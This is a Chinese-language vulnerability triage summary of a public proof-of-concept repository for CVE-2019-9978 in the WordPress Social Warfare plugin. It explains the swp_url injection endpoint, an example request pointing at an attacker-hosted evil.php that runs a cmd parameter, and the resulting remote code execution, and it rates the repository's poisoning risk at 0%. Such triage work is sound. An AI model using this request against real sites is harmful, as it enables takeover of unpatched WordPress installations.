## CVE-2019-9978-Social-Warfare-Stored-XSS-RCE

**漏洞编号:** CVE-2019-9978

**漏洞类型:** 存储型跨站脚本 (Stored XSS) / 远程代码执行 (RCE)

**影响应用:** WordPress Social Warfare Plugin

**危害等级:** 高危，可能导致网站被控制，用户信息泄露

**影响版本:** < 3.5.3

**利用条件:** 需要WordPress网站安装有Social Warfare插件且版本低于3.5.3

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-9978是WordPress Social Warfare插件3.5.3之前版本中存在的存储型XSS漏洞，该漏洞源于对`wp-admin/admin-post.php?swp_debug=load_options`的`swp_url`参数处理不当。攻击者可以通过构造恶意的`swp_url`参数，将恶意JavaScript代码存储在插件设置中。当管理员或其他用户访问包含插件设置的页面时，恶意代码将被执行，从而实现XSS攻击。更严重的是，通过精心构造的`swp_url`参数，可以触发远程代码执行(RCE)。

**利用方式：**

1.  攻击者发送包含恶意`swp_url`参数的请求到`wp-admin/admin-post.php?swp_debug=load_options`，例如`?swp_url=<攻击者服务器>/evil.php`，将payload注入到 Social Warfare 的设置中。
2.  提供的漏洞利用代码使用 docker-compose 搭建了模拟环境，包含受害者服务器和攻击者服务器。
3.  攻击者服务器上的`evil.php`文件包含PHP代码，该代码会执行通过GET参数`cmd`传递的系统命令。
4.  `exploit.py`脚本通过发送GET请求到受害者服务器，`swp_url`参数指向攻击者服务器上的`evil.php`文件，并将要执行的系统命令作为`cmd`参数传递给`evil.php`。
5.  受害者服务器的`index.php`接收到`swp_url`参数后，会通过`file_get_contents`函数读取攻击者服务器上的`evil.php`文件，并将其内容返回。然后，受害者服务器尝试将返回的内容解析为PHP数组，由于`evil.php`文件中包含`<pre>system($code)</pre>`，导致解析出错，但在解析前会执行system函数，从而导致远程代码执行。

**投毒风险分析：**

提供的POC代码的目的是为了验证漏洞的存在，方便用户进行测试。
查看相关文件后：
*   `exploit.py`脚本只是发送恶意请求并解析结果，没有发现恶意代码。
*   `evil.php`文件直接执行GET参数传递的命令，也没有隐藏的恶意逻辑。
*   `index.php` 模拟了存在漏洞的Social Warfare插件。
因此，该仓库中没有发现作者隐藏的投毒代码，投毒风险为0%。

**有效性：**
根据漏洞描述和提供的利用代码，可以确定该漏洞利用代码能够有效利用 CVE-2019-9978 漏洞实现远程代码执行，因此具有有效性。

**项目地址:** [MAHajian/CVE-2019-9978](https://github.com/MAHajian/CVE-2019-9978)

**漏洞详情:** [CVE-2019-9978](https://nvd.nist.gov/vuln/detail/CVE-2019-9978)